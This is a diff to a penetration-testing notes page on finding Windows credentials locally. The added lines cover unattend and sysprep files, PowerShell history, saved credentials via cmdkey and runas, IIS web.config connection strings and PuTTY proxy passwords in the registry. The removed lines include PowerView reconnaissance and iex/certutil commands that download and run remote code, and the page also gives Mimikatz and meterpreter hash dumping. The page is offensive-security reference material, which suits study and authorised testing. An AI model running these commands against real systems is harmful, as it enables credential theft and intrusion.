@@ -2,56 +2,104 @@
 
 ## Locally
 
+### Interesting File System
+
+<details>
+
+<summary>Windows configuration file</summary>
+
+```
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+```
+
+</details>
+
+<details>
+
+<summary>Powershell History</summary>
+
+
+
+Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands.
+
+```
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+</details>
+
+<details>
+
+<summary>Saved Windows Credentials</summary>
+
+Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
+
+```shell-session
+cmdkey /list
+```
+
+While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.
+
+```shell-session
+runas /savecred /user:admin cmd.exe
+```
+
+</details>
+
+<details>
+
+<summary>IIS Configuration</summary>
+
+
+
+Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
+
+```
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+```
+
+Here is a quick way to find database connection strings on the file:
+
+{% code title="Powershell" %}
+```shell-session
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+{% endcode %}
+
+</details>
+
+### Retrive from Softwares
+
+<details>
+
+<summary>PuTTY</summary>
+
+PuTTY is a popular SSH client for Windows. It allows users to save sessions with connection details like IP and username, so they don't have to enter them every time. Though PuTTY doesn't save SSH passwords, it does save proxy settings with plain text passwords. To find saved proxy passwords, look for the `ProxyPassword` under this registry key using the following command:
+
+```
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+{% hint style="info" %}
+Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
+{% endhint %}
+
+</details>
+
+
+
 ### Mimikatz
 
 {% content-ref url="../../../tools/tools/mimikatz.md" %}
 [mimikatz.md](../../../tools/tools/mimikatz.md)
 {% endcontent-ref %}
 
-#### Target preparation&#x20;
-
-The primary thing to do is to look a PC where we are Local admin or have some privilege. Once we find the computer, we connect to it.
-
-```powershell
-powershell -ep bypass
-. .\PowerView.ps1
-
-Get-Domain
-Find-LocalAdminAccess # find access where we are local admin
-
-# connect in those pc 
-Enter-PSSession $LOCAL_ADMIN_SYSTEM # (ex. seclogs.research.DOMAIN.local)
-```
-
-Now, check the privilege that we have in the machine with this command:
-
-```powershell
-whoami /all
-```
-
 Then, we need to transfer the tool to dump hashes to the target machine.
-
-{% code title="Linux -> Windows Target" %}
-```bash
-# into linux
-cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
-python3 -m http.server 80 
-
-# Download files from windows target
-iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
-certutil -urlcache -f http://$IP/$FILE_NAME $LOCAL_FILE_NAME
-```
-{% endcode %}
-
-{% code title="Windows -> Windows Target" %}
-```powershell
-# Start a HTTP File Server (HFS) into a Windows machine with .exe
-# https://www.rejetto.com/hfs/
-
-# Download files from windows target
-iex (New-Object Net.WebClient).DownloadString('http://$IP/$FILE_NAME')
-```
-{% endcode %}
 
 #### mimikatz.exe
 
@@ -183,7 +231,9 @@ cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' -M lsassy
 If we have a open meterpreter session&#x20;
 
 ```bash
-msf> hashdump
+use post/windows/gather/hashdump
+set SESSION
+run
 ```
 
 
